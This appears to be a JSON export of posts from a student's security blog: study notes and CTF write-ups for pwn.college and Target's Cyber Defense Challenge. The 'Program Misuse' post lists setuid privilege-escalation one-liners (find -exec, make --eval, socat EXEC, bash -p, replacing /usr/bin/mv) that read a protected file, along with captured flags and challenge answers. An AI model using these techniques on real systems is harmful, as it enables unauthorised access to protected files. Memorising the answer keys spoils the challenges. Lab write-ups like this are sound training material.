[{"content":" Target Cyber Defense Challenge Introduction University of Texas at Austin Computer Science, 2025 Digital forensics and incident response Interned at CrowdStrike My knowledge coming in Assembly (learned ARM, but did go through some x86 on my own) Prior CTF experience Coding Basic tools such as Wireshark Tier 1 Cryptography / Steganography Reverse engineering USB forensics Cyber threat intelligence Cryptography Beware the Ides of March Now You See Me, Now You Don’t A Snowy Disposition (challenging) Figuring out which spaces counted (only counted spaces at the end at first) Follow the Dotted Line A Particular Exchange What I learned Recognizing ciphers / type of steg Tools Cyberchef stegsolve (aperisolve/stegonline) stegsnow Reverse engineering A5M (challenging) r04c4 (challenging) Sc0rf1g (challenging) (HARDEST) Yarrr (challenging) Didn\u0026rsquo;t think I had the flag Web2ut3 What I learned x86 Using decompilers USB forensics Find the Blue Yeti Know your Filters! Moving Files I think this Mouse is Plotting on us? Keypress…? Keypressing…? Keep pressing on! What I learned Wireshark Scripting Cyber threat intelligence WHOIS responsible for this IP address? Don’t sweat the MITRE technique ISOlate the domain The writers are on Cobalt Strike and this is the best pun I could come up with Can I copy your ransomware? Yeah just don’t do it opcode for opcode. What I learned VirusTotal Yara Learning how to read / doing research CLOP MOVEit Tier 2 Ransomware aftermath Checkpoint 1: “Air-gapped” Checkpoint 2: The last easy one for a while Checkpoint 3: Infinite monkey theorem Checkpoint 4: Call for backup Checkpoint 5: Raise the flag.txt (challenging) Padding Checkpoint 6: Are we there yet? Checkpoint 7: El plan What I learned Cyberchef for simple tasks https://tinyurl.com/cyberchef-target Scripting for complex tasks Future IoT Forensics Research Malware analysis Cryptography CTF chall inspo What I liked Story \u0026ndash; very applicable Tooling Collaborative Perfect amount of difficulty Beginner friendly FUN!!! Thoughts Workshops before event? Keep it collaborative THANK YOU!!! https://www.linkedin.com/in/rebeccahuang3/ https://g0ldf15h.github.io/ ","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier3/","summary":"Target Cyber Defense Challenge Introduction University of Texas at Austin Computer Science, 2025 Digital forensics and incident response Interned at CrowdStrike My knowledge coming in Assembly (learned ARM, but did go through some x86 on my own) Prior CTF experience Coding Basic tools such as Wireshark Tier 1 Cryptography / Steganography Reverse engineering USB forensics Cyber threat intelligence Cryptography Beware the Ides of March Now You See Me, Now You Don’t A Snowy Disposition (challenging) Figuring out which spaces counted (only counted spaces at the end at first) Follow the Dotted Line A Particular Exchange What I learned Recognizing ciphers / type of steg Tools Cyberchef stegsolve (aperisolve/stegonline) stegsnow Reverse engineering A5M (challenging) r04c4 (challenging) Sc0rf1g (challenging) (HARDEST) Yarrr (challenging) Didn\u0026rsquo;t think I had the flag Web2ut3 What I learned x86 Using decompilers USB forensics Find the Blue Yeti Know your Filters!","title":"Target Tier 3"},{"content":"Basics Starting the script Shebang: #! : used by the shell to decide which interpreter to run the rest of the script\nStarts with a \u0026ldquo;shebang\u0026rdquo; #! and path to shell you want script to use #!/bin/bash Executing the script Assign execution rights to user: chmod u+x \u0026lt;file\u0026gt;.sh chmod \u0026ndash;\u0026gt; modifies ownership of a file for the current user: u +x \u0026ndash;\u0026gt; execution rights Variables and data types Every variable is an array so can start using any variable as an array. Set a variable thing=1\nCannot have spaces in between (NO GOOD: thing = 1)\nIf you want to use a space: (( foo = 3 )) Can also reassign thing=$foo\nIf includes spaces, need to quote around it thing=\u0026quot;hello world\u0026quot;\nReference a variable A reference to a variable is an implicit reference to the first index\necho $thing\nUse dollar sign $\nFor variable operations and arrays, wrap around braces echo ${foo}\nReference index\nfoo[0]=1 foo[1]=2 echo ${foo[1]} # prints 2 Delete a variable foo=1 echo $foo unset foo echo $foo References https://www.freecodecamp.org/news/bash-scripting-tutorial-linux-shell-script-and-command-line-for-beginners/\nhttps://matt.might.net/articles/bash-by-example/\nhttps://devhints.io/bash\n","permalink":"https://g0ldf15h.github.io/posts/dev_notes/bash-scripting/","summary":"Basics Starting the script Shebang: #! : used by the shell to decide which interpreter to run the rest of the script\nStarts with a \u0026ldquo;shebang\u0026rdquo; #! and path to shell you want script to use #!/bin/bash Executing the script Assign execution rights to user: chmod u+x \u0026lt;file\u0026gt;.sh chmod \u0026ndash;\u0026gt; modifies ownership of a file for the current user: u +x \u0026ndash;\u0026gt; execution rights Variables and data types Every variable is an array so can start using any variable as an array.","title":"Bash Scripting Notes"},{"content":"Just a random sort of notes as I encounter things in C++\nCommand Line Arguments https://www.geeksforgeeks.org/command-line-arguments-in-c-cpp/\nCommand line arguments: values given after the name of the program in the command-line shell of OS. Handled by main\nargc (argument count): number of command-line arguments\nNon- negative argv (argument vector): array of character pointers listing all the arguments\nargv[0] name of the program -argv[1] points to the first command line argument Compiling with g++ https://natekohl.net/ut/cs105/notes/basics.html (bc idk where my class notes are) g++ -Wall -Werror -o my_program my_program.cc Then execute with: ./my_program\n-Wall issue warnings about anything the compiler finds suspicious -Werror Treat any warnings it encounters as errors (won\u0026rsquo;t compile) Headers vs Implementation files Split class definitions into header (.h) and implementation (.cc) files\nTo compile, use a Makefile so it\u0026rsquo;s less complicated User defined types https://natekohl.net/ut/cs105/notes/custom_types.html\nEnumerated Typedef Struct Class ","permalink":"https://g0ldf15h.github.io/posts/dev_notes/c++-notes/","summary":"Just a random sort of notes as I encounter things in C++\nCommand Line Arguments https://www.geeksforgeeks.org/command-line-arguments-in-c-cpp/\nCommand line arguments: values given after the name of the program in the command-line shell of OS. Handled by main\nargc (argument count): number of command-line arguments\nNon- negative argv (argument vector): array of character pointers listing all the arguments\nargv[0] name of the program -argv[1] points to the first command line argument Compiling with g++ https://natekohl.","title":"C++ Notes"},{"content":"Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid\nArchives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives\n-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out\nWhen creating archives during copy out with -o, If you don\u0026rsquo;t pass an archive, it prints out the output to standard output\necho flag | cpio -ov flag �q�w��d��9flagpwn.college{4oCrlSizeUID4Sfh1W5ARqDaR3L.0FN2EDL0MDMwEzW} �q TRAILER!!!1 block Read flags by making them execute other commands 23 genisoimage Generate ISO9660/Joilet/HFS hybfrid filesystems\nhttps://gtfobins.github.io/gtfobins/genisoimage/ https://linux.die.net/man/1/genisoimage https://www.apt-browse.org/browse/debian/jessie/main/all/cdrkit-doc/9:1.1.11-3/file/usr/share/doc/cdrkit-doc/genisoimage/README.sort -sort FILE : Sort file content locations according to rules in FILE\n-sortsort_file\nSort file locations on the media. Sorting is controlled by a file that contains pairs of filenames and sorting offset weighting. If the weighting is higher, the file will be located closer to the beginning of the media, if the weighting is lower, the file will be located closer to the end of the media. There must be only one space or tabs character between the filename and the weight and the weight must be the last characters on a line. The filename is taken to include all the characters up to, but not including the last space or tab character on a line. This is to allow for space characters to be in, or at the end of a filename. This option does not sort the order of the filenames that appear in the ISO9660 directory. It sorts the order in which the file data is written to the CD image, which is useful in order to optimize the data layout on a CD. See README.sort for more details.\nhacker@program-misuse-level-23:/$ genisoimage -sort flag genisoimage: Incorrect sort file format pwn.college{gHWhhc5I1411-6NH28ekb-cUwQq.0VN2EDL0MDMwEzW} The sort_file contains two columns of filename and weight. Since the flag didn\u0026rsquo;t have the proper formatting, it printed it out in an error message\n24 env Usage: env [OPTION]\u0026hellip; [-] [NAME=VALUE]\u0026hellip; [COMMAND [ARG]\u0026hellip;]\nenv cat flag pwn.college{QjA_o9dSRxJZr-qs3N6gL3Hk02a.0lN2EDL0MDMwEzW} 25 find https://www.baeldung.com/linux/find-exec-command Find the file and then use exec to run other commands on the file find flag -exec cat {} \\; pwn.college{QmQSDWK93OXRzLdFcc41GFD0sG0.01N2EDL0MDMwEzW} 26 make https://gtfobins.github.io/gtfobins/make/ https://stackoverflow.com/questions/10435490/how-eval-function-can-be-used-in-makefile https://make.mad-scientist.net/the-eval-function/ Interesting. eval wasn\u0026rsquo;t stated in the manual. It allows you to define new makefile constructs. The argument to the eval function is expanded, then the results of that expansion are parsed as makefile syntax. make -s --eval=$\u0026#39;x:\\n\\t-\u0026#39;\u0026#34;cat flag\u0026#34; pwn.college{sBoIeH0EhwZzqExS44fBJHf3Zmr.0FO2EDL0MDMwEzW} Disguising itself as makefile syntax to fool make to run the command. x variable : separates variable from command \\n\\t syntax (enter and indent) cat flag command\nx: cat flag eval notes Metaprogramming: ability of a program to generate other programs, or even modify itself while running\neval allows you to ask make to parse text that you provide (as the argument to the function) as if it were a makefile\n27 nice nice -n 20 cat flag pwn.college{UE17dBTj7bVqcsbAeMMcBtg1brP.0VO2EDL0MDMwEzW} 28 timeout timeout --preserve-status 0 cat flag pwn.college{k04-8k9lxNNXbW1dYdJg6wLbvOJ.0FM3EDL0MDMwEzW} 29 stdbuf stdbuf -i 0 cat flag pwn.college{QrX-myFr7VDaTJaUpMTWfOj9ac3.0VM3EDL0MDMwEzW} 30 setarch setarch -R cat flag pwn.college{0F9Xi_ucPd03t6kU9Z3ukyUjTzC.0lM3EDL0MDMwEzW} 31 watch watch -x cat flag 32 socat nc -l 9999 socat EXEC:\u0026#34;cat flag\u0026#34; TCP4:localhost:9999 pwn.college{Y-n7znhkzgIwpeVMFQVbmg7rUiy.0FN3EDL0MDMwEzW} Requires some light programming to read the flag.! 33 whiptail whiptail --textbox --scrolltext flag 10 50 34 awk awk \u0026#39;{print $1}\u0026#39; flag pwn.college{E9rO0UoMJAUFwehaimlPo66QYPH.0lN3EDL0MDMwEzW} 35 sed print first line of file\nsed -n \u0026#39;1p\u0026#39; flag pwn.college{8Etg6VfAzIv4QmA8cRGGs-hKba0.01N3EDL0MDMwEzW} 36 ed https://www.redhat.com/sysadmin/introduction-ed-editor ed flag ? p pwn.college{M_MFwqQw_lb6fPxx3Cwo7s1cy1B.0FO3EDL0MDMwEzW} Lets you get the flag by doing tricks with permissions! 37 chown https://phoenixnap.com/kb/linux-chown-command-with-examples chown hacker flag cat flag pwn.college{ox8X8D95ao8YTYZU1OhMovgkSlF.0VO3EDL0MDMwEzW} 38 chmod chmod 777 flag cat flag pwn.college{o_KtmcukknMa17Y7NaT_A_Vx0Jx.0FM4EDL0MDMwEzW} 39 cp https://stackoverflow.com/questions/34326484/how-to-copy-files-and-give-them-permission-of-destination-directory cp --no-preserve=mode,ownership flag boink cat boink pwn.college{cfFDqccRpUieZ-8IrmE3Bi_PIVX.0VM4EDL0MDMwEzW} 40 mv Wow this was a creative solution: https://hackmd.io/@jvX0z8tMSVy82TKMOd78zw/B1V06QEVo Had to read the writeup for it. So essentially I was poking around, trying to see if I could move files without preserving the permissions of the original file, but I wasn\u0026rsquo;t getting any results. I eventually read some writeups. This is such a fascinating challenge \u0026ndash; rename cat to mv , run the challenge binary again to set the suid to mv which is cat in disguise, then read the flag\nmv /usr/bin/cat /usr/bin/mv ./challenge/babysuid_level40 mv flag pwn.college{gRrAxec-vA-hdRN8zrtYieTf24v.0lM4EDL0MDMwEzW} Lets you read the flag because they let you program anything! 41 perl https://www.geeksforgeeks.org/perl-opening-and-reading-a-file/\nNote had to use single quotes instead of double quotes perl -e \u0026#39;open(fh, \u0026#34;flag\u0026#34;) or die; $firstline = \u0026lt;fh\u0026gt;; print \u0026#34;$firstline\u0026#34;;\u0026#39; pwn.college{4omGoc2usqOLQHfIPTlErXr7ZV4.01M4EDL0MDMwEzW} 42 python Yay python! -c to compile\npython -c \u0026#39;f=open(\u0026#34;flag\u0026#34;, \u0026#34;r\u0026#34;); print(f.read())\u0026#39; pwn.college{woYeozdqCZlaPEQL5OHMOGhirJN.0FN4EDL0MDMwEzW} 43 ruby TF=$(mktemp) echo \u0026#39;f=File.open(\u0026#34;flag\u0026#34;); r = f.read; puts(r) \u0026#39; \u0026gt; $TF ruby $TF pwn.college{sICaLJYVdT_rY74pyxtbb1r48tL.0VN4EDL0MDMwEzW} 44 bash https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation bash -p flag flag: line 1: pwn.college{wzjJgYq8MugKvbB17in-j2-Bv0h.0lN4EDL0MDMwEzW}: command not found -p privileged mode. Tells bash to not set up an environment and just run it with what you\u0026rsquo;re already using. Since setuid is set, it\u0026rsquo;s treated as root.\n(aka pretty please)\n45 date date --file=flag date: invalid date \u0026#39;pwn.college{E57sz6e0gPPGZiyXahtDTw-AT0L.01N4EDL0MDMwEzW}\u0026#39; Just straight up wasn\u0026rsquo;t designed to let you read files! 46 dmesg dmesg -F flag [ 0.000000] pwn.college{I-e20m2Z1DlzHzNGmBdUcMzEPHU.0FO4EDL0MDMwEzW} 47 wc wc --files0-from=flag wc: \u0026#39;pwn.college{oZ5vCz7SrQA_qbxZeCexxzmR-EQ.0VO4EDL0MDMwEzW}\u0026#39;$\u0026#39;\\n\u0026#39;: No such file or directory 48 gcc gcc @flag gcc: error: pwn.college{gwjUmod94a_2j-jp8aIXUoxgIiW.0FM5EDL0MDMwEzW}: No such file or directory gcc: fatal error: no input files compilation terminated. 49 as as @flag Assembler messages: Error: can\u0026#39;t open pwn.college{smeuseqsnW3x76HLH23ythuG_6V.0VM5EDL0MDMwEzW} for reading: No such file or directory ","permalink":"https://g0ldf15h.github.io/posts/pwn_college/program_misuse/","summary":"Privilege escalation Run an suid binary suid: execute with the eUID of the file owner rather than the parent process sgid: execute with the eGID of file owner rather than parent process sticky: used for shared directories to limit file removal to file owners babysuid Programs that let you directly read the flag by setting the suid\nArchives 22 cpio https://www.computerhope.com/unix/ucpio.htm#Copy-Out-Mode cpio: copy files to and from archives\n-R Set the ownership of all files created to the specified USER and/or GROUP --to-std-out","title":"Pwn College: Program Misuse"},{"content":"Writing to file Creating a new file f = open(\u0026ldquo;filename.txt\u0026rdquo;, \u0026ldquo;x\u0026rdquo;)\nReading from a file File_object = open(r\u0026quot;File_Name\u0026quot;, \u0026ldquo;Access_Mode\u0026rdquo;)\nConversion Converting from byte to int int.from_bytes(num, endianess (\u0026quot;big\u0026quot; or \u0026quot;little\u0026quot;))\nConverting from byte to hex byte.hex()\nFrom hex to byte bytes.fromhex(HEX)\nCreating a class self \u0026ndash;\u0026gt; this in java\nhttps://www.w3schools.com/python/python_classes.asp https://stackoverflow.com/questions/141545/how-to-overload-init-method-based-on-argument-type\n","permalink":"https://g0ldf15h.github.io/posts/dev_notes/python/","summary":"Writing to file Creating a new file f = open(\u0026ldquo;filename.txt\u0026rdquo;, \u0026ldquo;x\u0026rdquo;)\nReading from a file File_object = open(r\u0026quot;File_Name\u0026quot;, \u0026ldquo;Access_Mode\u0026rdquo;)\nConversion Converting from byte to int int.from_bytes(num, endianess (\u0026quot;big\u0026quot; or \u0026quot;little\u0026quot;))\nConverting from byte to hex byte.hex()\nFrom hex to byte bytes.fromhex(HEX)\nCreating a class self \u0026ndash;\u0026gt; this in java\nhttps://www.w3schools.com/python/python_classes.asp https://stackoverflow.com/questions/141545/how-to-overload-init-method-based-on-argument-type","title":"Python Notes"},{"content":"Incomplete; Probably won\u0026rsquo;t finish\nCheckpoint 1: \u0026ldquo;Air-gapped\u0026rdquo; Points 10\nThe FBI infiltrated SHINY SCORPION\u0026rsquo;s command \u0026amp; control network!\nThey\u0026rsquo;ve passed along the victim database related to the campaign that targeted Keep it Simple Security (KiSSec). They\u0026rsquo;ve also included a Python script that can deobfuscate and parse the ransomware config.\nFBI intelligence indicates that it should be possible to undo the ransomware\u0026rsquo;s encryption using the information stored in these files!\nBefore we start any decryption, though, they suggest finding our unique victim ID.\nWe were given a zip containing most files we would need. In the FBI directory was a readme, a config parser, and the database of victims that Shiny Scorpion had exploited, клиенты.db . I opened the binary using https://sqliteviewer.app/ to make the db easier to parse. There were three columns: id, amt, and the key .\nid = victim id amt = money to pay key = encoded RSA private key I found a record that looked familiar: the id was the address that our breached company was to send $500,000 worth of bitcoin to as stated in ransom.txt. Flag: 14hahahaEvMFqrCd2J9vsNjaUhjEdYCsTnG3r\nCheckpoint 2: The last easy one for a while Points: 10\nNow that we know our \u0026ldquo;customer\u0026rdquo; ID, we should be able to find the ransomware\u0026rsquo;s decryption key.\nFlag CTFd has some limitations that make it impossible to submit the key directly 😞\nInstead, please generate and submit a SHA256 checksum of the key.\nFormat SHA256 digest, 64 hexadecimal digits, case-insensitive\nWhen hashing, ensure that you don\u0026rsquo;t accidentally introduce any leading or trailing whitespace around the key. Any changes, no matter how small, will generate a completely different hash. Be careful copy/pasting!\nI took the key from the user db. I noticed that there was a repeating string at the beginning and end of the key: YF0gY . As the malware config used a public key and knowing that a private key started with -----BEGIN RSA PRIVATE KEY-----, I came to the conclusion that it had to be obfuscated. The = hinted towards base64. I tried it with ROT13, and it worked!\nFrom there, I got the sha256 checksum.\ncat key.txt | sha256sum flag: a92bbe46078d2295353bad012292f84ee0564ffb89f7bbe7cb945b8cbf1d1e51\nNote: Check the appendix for the encoded decoded private key.\nCheckpoint 3: Infinite monkey theorem Points: 10\nNow that we\u0026rsquo;ve got the key, we should be able to make some headway on those encrypted files.\nThe README would be a great place to start!\nFlag format\ncp3:rest_of_the_flag, including the cp3: part, case-sensitive\nTried just uploading the file in cyberchef and decrypting with cyberchef, but didn\u0026rsquo;t work because the message length was invalid. RSA is used to encrypt messages that are shorter than the modulus of the public key. -----BEGIN RSA PRIVATE KEY----- RSAPrivateKey ::= SEQUENCE { version Version, modulus INTEGER, -- n publicExponent INTEGER, -- e privateExponent INTEGER, -- d prime1 INTEGER, -- p prime2 INTEGER, -- q exponent1 INTEGER, -- d mod (p-1) exponent2 INTEGER, -- d mod (q-1) coefficient INTEGER, -- (inverse of q) mod p otherPrimeInfos OtherPrimeInfos OPTIONAL } -----END RSA PRIVATE KEY----- As the private key was 4096, the maximum length that a message could be encrypted is 512 bytes.\nDecrypted with the first 512 bytes: L3NmBaEbnKAsp2uiqJkxK2WyK3WuozEioFRuVFRuVFR= xjgufagfCj+xBeAm5brk4D== From base64 ROT13: flag: cp3:this_should_be_random!!!!!!!\nReferences https://security.stackexchange.com/questions/90169/rsa-public-key-and-private-key-lengths https://www.dcode.fr/rsa-cipher Checkpoint 4: Call for backup Points: 10\nWe need to decrypt the rest of the README.\nIt should contain contact information for the contractors that originally set this backup system up.\nWhat is the phone number for their emergency hotline?\nKey : cp3:this_should_be_random!!!!!!! IV: \u000ba²{l?\u000f¤:³sæ±á\nAES Decrypt CBC/NoPadding\nflag: +1 (123) 867-5309\nCheckpoint 5: Raise the flag.txt Points: 10\nNo luck with the contractors yet; even in this emergency their fees were still deemed too high.\nThe recovery key\u0026rsquo;s not in the README, so we need to decrypt the rest of the files for them anyways.\nFlag format cp5:the_rest_the_flag, with or without the cp5 part, case-insensitive\nin keyfile bin:\nRSA Decrypt the first 512 bytes: cf076bf736b981a70b33e3480127572ea1be1beb97ba2e0 f601f99df6bacac9dd1dd6e7f113cb786\nmjqe9mn5tnpYZ+AVNFqKYdT+T+hKhv4XQTrNURq+tb8= LO+M32hfeW3E3J5/RGl3ut== base64\nÏ\u0007k÷6¹§\u000b3ãH\u0001\u0026#39;W.¡¾\u001bëº. g\u001cG~`\u001fßk¬¬ÑÝn\u0011\u0026lt;· Convert from base 64 Kinda stuck on this. Idea so far:\nNeed to decrypt files with RSA key and AES. However, so far, it just isn\u0026rsquo;t working. What I can do so far: Extract the base64 with the RSA key. Need to make sense of wtf the key is supposed to be Decrypt with AES Get rid of first 512 bytes maybe of the decrypted text. Python Script:\nfrom Crypto.Cipher import AES def __unpad(plain_text): last_character = plain_text[len(plain_text) - 1:] return plain_text[:-ord(last_character)] for i in range(1, 102): with open(f\u0026#34;cyberchef/{i}.txt\u0026#34;, \u0026#34;r\u0026#34;) as aesFile: aesData = aesFile.read() aesKey = bytearray.fromhex(aesData[:64]) aesIV = bytearray.fromhex(aesData[64:]) cipher = AES.new(aesKey, AES.MODE_CBC, iv=aesIV) numString = str(i).rjust(4, \u0026#34;0\u0026#34;) with open(f\u0026#34;old_desktop/desktop cleanup.7z.{numString}.sting\u0026#34;, \u0026#34;rb\u0026#34;) as cipherFile: ciphertext = cipherFile.read() ciphertext = ciphertext[512:] plaintext = cipher.decrypt(ciphertext) with open(f\u0026#34;decrypted_stuff/desktop cleanup.7z.{numString}\u0026#34;, \u0026#34;wb\u0026#34;) as plainFile: plainFile.write(__unpad(plaintext)) # plaintext = cipher.decrypt(ciphertext) flag : cp5:i_sure_hope_you_didn't_decrypt_this_manually\nCheckpoint 6: Are we there yet? flag: MFWG233TORPXI2DFOJSSCIJBEE======\nCheckpoint 7: El plan ","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier2_writeups/tier-2-writeups/","summary":"Incomplete; Probably won\u0026rsquo;t finish\nCheckpoint 1: \u0026ldquo;Air-gapped\u0026rdquo; Points 10\nThe FBI infiltrated SHINY SCORPION\u0026rsquo;s command \u0026amp; control network!\nThey\u0026rsquo;ve passed along the victim database related to the campaign that targeted Keep it Simple Security (KiSSec). They\u0026rsquo;ve also included a Python script that can deobfuscate and parse the ransomware config.\nFBI intelligence indicates that it should be possible to undo the ransomware\u0026rsquo;s encryption using the information stored in these files!\nBefore we start any decryption, though, they suggest finding our unique victim ID.","title":"Target Tier 2"},{"content":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this first part, I will go over the challenges in the cryptography / steganography section.\nBeware the Ides of March 100 points\nYou have intercepted the following message from the threat actor! Decrypt the message to reveal the secret phrase:\nGUR GNETRG UNF ORRA NPDHVERQ\nThe Ides of March is associated with the assassination of Julius Caesar, who is also the namesake of the Caesar Cipher (ROT13). It is a substitution cipher in which the letters are rotated by a certain amount (the key).\nI put it in CyberChef.\nFlag: THE TARGET HAS BEEN ACQUIRED\nNow You See Me, Now You Don\u0026rsquo;t 200 points\nYou have intercepted a email sent between Bob and Alice, who we believe to be members of Shiny Scorpion. See a transcription of the message below:\nHi Bob,\nOur good friend Vigenère is looking to follow up on the financial reports you\u0026rsquo;re working on. Can you give me a timeline on when you think they would be ready to share out?\nBest, Alice\nThere doesn\u0026rsquo;t look to be anything malicious in the email, but the embedded photo in the email hit the automated threat detection. Can you find the true message of the email?\nTODO: Go more in depth on identifying and what is LSB Steg Attached image: The attached image was a simple image of a scorpion. This tipped me off that there was some sort of steganography involved as there was nothing obvious in plain sight. To inspect the image, I used stegsolve. However, there are other online alternatives that work just as well such as https://stegonline.georgeom.net/ or https://www.aperisolve.com/.\nWith the filter, I noticed that there was some interesting bits at the top of the image, which was an indicator that there may be some data embedded in the least significant bit. LSB steganography is the concept in which the least significant bit is replaced with the data to be hidden.\nI ran zsteg to extract the LSB: KaierljsipvgbediecsvhrrscaEvvqyq=====\nI used the Vigenère cipher, as hinted by the challenge description, to decrypt the string. I knew that the cipher used a key, so I wondered if there was another component in which the key was hidden. However, after searching, I couldn\u0026rsquo;t find anything, so I tried the name of the ransomware gang, shinyscorpion, which worked!\nFlag: Start the ransomware attack on Monday\nA Snowy Disposition 200\nYou\u0026rsquo;ve gained access to a suspected Shiny Scorpion drop file! But, before you can analyze it for malware, you must figure out the password to file so that you can view it in a containment VM. The only thing to give you a hint is a poem included in the same directory as the Shiny Scorpion dropfile. Maybe you can find a clue?\nThe file given was a poem of Spellbound by Emily Brontë. At first, I couldn\u0026rsquo;t tell if any thing was off about it. Then, on further inspection, it seemed like there were extra spaces at the end of each line of the poem. I tried counting all the whitespaces and converting from ASCII to characters, but to no avail. This led me to research whitespace steganography and I thought that it could be using stegsnow because of the name of the challenge. However, it was simpler than it appeared. Seems like all it took was counting all the whitespaces, as I had not accounted for the spaces between the words.\nI also made a really small script to count the whitespaces because I didn\u0026rsquo;t want to manually count it:\nfor line in text: count = 0 for char in line: if char == \u0026#34; \u0026#34;: count+=1 print(count, end = \u0026#34; \u0026#34;) \u0026gt; 81 85 49 88 48 84 49 67 65 76 76 89 When we convert that to ASCII, we get the flag.\nFlag: QU1X0T1CALLY\nFollow the Dotted Line 200\nThe following message was found in a packet capture file originating from a device that is suspected to be associated with the Shiny Scorpion malware group. Can you find the hidden message?\n.\u0026ndash;.- \u0026ndash;\u0026hellip; \u0026ndash;.\u0026ndash; -\u0026hellip;- -.-.- \u0026mdash;\u0026ndash; -..\u0026ndash; -.\u0026mdash;\nLabor Day sale!\nYou won\u0026rsquo;t want to miss this! We\u0026rsquo;re putting on our biggest Labor Day sale yet. Mark your calendars to bring home the bacon with these unbelievable savings!\n.\u0026mdash;. -.\u0026mdash; -..\u0026ndash; -\u0026hellip;- -.-.- \u0026mdash;\u0026ndash; \u0026mdash;.- \u0026ndash;.\u0026ndash;\nAt first, the dots and dashes made the cipher look like Morse code. However, upon trying Morse Code, the plaintext that came out didn’t seem right. On further analysis, I saw that the word \u0026lsquo;bacon\u0026rsquo; was marked in red. I recall doing a prior CTF challenge with the baconian cipher. The baconian cipher works by taking two symbols such as A and B and creating encodings with those two binary symbols with a length of 5. The cipher matched this behavior, so it was simply a matter of decoding the baconian cipher.\nThis wasn\u0026rsquo;t necessary, but I made a simple script to convert the dots and dashes to As and Bs:\ns = \u0026#34;.--.- --... --.-- -...- -.-.- ----- -..-- -.--- .---. -.--- -..-- -...- -.-.- ----- ---.- --.--\u0026#34; for l in s: if l == \u0026#34;.\u0026#34;: print(\u0026#34;A\u0026#34;, end=\u0026#34;\u0026#34;) elif l == \u0026#34;-\u0026#34;: print(\u0026#34;B\u0026#34;, end=\u0026#34;\u0026#34;) else: print(\u0026#34; \u0026#34;, end=\u0026#34;\u0026#34;) Then it was just a matter of putting it in CyberChef.\nFlag: THEPLANISINPLACE\nA Particular Exchange 300\nThe below email has been intercepted and Threat Intellegence believes that the proof of the infiltration of Shiny Scorpion into the organization can be extracted somewhere in this email. Can you find the shared information?\nHi Bob,\nAs you may have heard from Director Diffie-Hellman, there is going to be a party to support inter-team communication. Can you arrange to have nine orders of papaya salad, seven orders of the grape pastries, six dozen apples, and eight loaves of banana bread?\nThe shared information is of the upmost importance.\nThanks, Alice\nTODO: explain Diffie-Hellman better\nThis was a simple Diffie-Hellman key exchange problem. Seems like there was supposed to be more to it, but was taken out.\nFrom the description: Prime number P = 9\nGenerator number G = 7\nPrivate key (secret number) a = 6\nPrivate key (secret number) b = 8\nYou can manually count it or put it in a shared key calculator such as https://www.dcode.fr/diffie-hellman-key-exchange\nThe calculation (credit to the above link) is as follows:\nPublic Key A = G^a%P = 7^6%9 = 1\nPublic Key A = G^b%P = 7^8%9 = 4\nSecret S = B^a%P = A^b%P = 1\nFlag: 1\n","permalink":"https://g0ldf15h.github.io/posts/target_ctf/tier1/target1/","summary":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this first part, I will go over the challenges in the cryptography / steganography section.\nBeware the Ides of March 100 points\nYou have intercepted the following message from the threat actor! Decrypt the message to reveal the secret phrase:","title":"Target I: Cryptography and Steganography"},{"content":"Recently I completed Tier 1 of Target\u0026rsquo;s Cyber Defense Challenge offered to members of the WiCys (Women in Cybersecurity) organization. It was a CTF comprised of four categories: cryptography/steganography, reverse engineering, USB forensics, and cyber threat intelligence. In this second part, I will go over the challenges in the reverse engineering section. In my opinion, this was the most technical challenge as knowledge of basic assembly (x86) and the C programming language was required.\nShoutout to Lan Che for bringing up the alternative solutions for A5M and Yarrr, would suggest looking at writeups :3\nChallenges A5M 100 points\nMy reversing skills are not what they use to be. Can you analyze the assembly code and recover the flag?\n*TODO: Go more in depth with tracing through the assembly\nIn this challenge, a file called A5M.bin was given although it was determined that it was a simple txt file after running the file command. The file included some assembly. I decided to statically analyze the file and trace through the assembly line by line while keeping track of the stack.\nI translated the assembly into C code to make it easier for me to understand:\nlong long int var1 = 1893775824357884702; long long int var2 = 739178745589344000; long long int var3 = 1087083870128062999; long long int var4 = 8032295758502981496; // \u0026#34;xorxorxor\u0026#34; unsigned short var5 = 114; unsigned int var6 = 21; unsigned char str1[] = {0x1e, 0x03, 0x13, 0x1f, 0x14, 0x0b, 0x48, 0x1a, 0x00, 0x27, 0x5f, 0x1c, 0x27, 0x17, 0x42, 0x0a, 0x30, 0x05, 0x19, 0x16, 0x0f}; unsigned char str2[] = {0x78, 0x6f, 0x72, 0x78, 0x6f, 0x72, 0x78, 0x6f, 0x72}; for (int i = 0; i \u0026lt; var6; i++) { unsigned char ch1 = str1[i]; int index = i % strlen(str2); unsigned char ch2 = str2[index]; str1[i] = ch1 ^ ch2; } puts(str1); Flag: flag{y0ur_0n_x0r_way}\nEDIT: Alternative way: just add the header and run it in tio.run\nProgramming language: gcc, x64, Linux\nHeader:\n.intel_syntax noprefix .section .data .section .text .globl main r04c4 100 points\nIt seems I skipped RE101. I may need to brush up on my C programming before analyzing the code.\nTODO: Go more in depth explaining rc4\nThe attached file was a C program.\nAt first look, a few things stood out.\nk refers to the key. The characters, when printed out, resulted in r0tc4. I was wondering if it was intentional as the title of the challenge was r04c4. unsigned char k[]=\u0026#34;\\162\\x30\\164\\x63\\64\u0026#34;; c holds the text as follows: c[]={0x54,0206,0xdb,0242,0xd7,0151,0x38,0114,0x59,0235,0xd9,0340,0xeb,0100,0x84,0365,0xbd,0237,0x39,0143,0xa3,0243 }; // a mix of hex (0x) and octal (0) values d() refers to the method for decrypting (and encrypting) the message. There was a call to d() in main, but no arguments were provided, so I added d(k, c, p) where k is the key, c is the message to be decrypted, and p is the array to be filled with the decrypted text. Running the code as it is gives me a bunch of garbled text. Looking at the code further, as I know d() is a method for encryption/decryption, I wanted to figure out what cipher it was using. As the title of the challenge hinted, I eventually 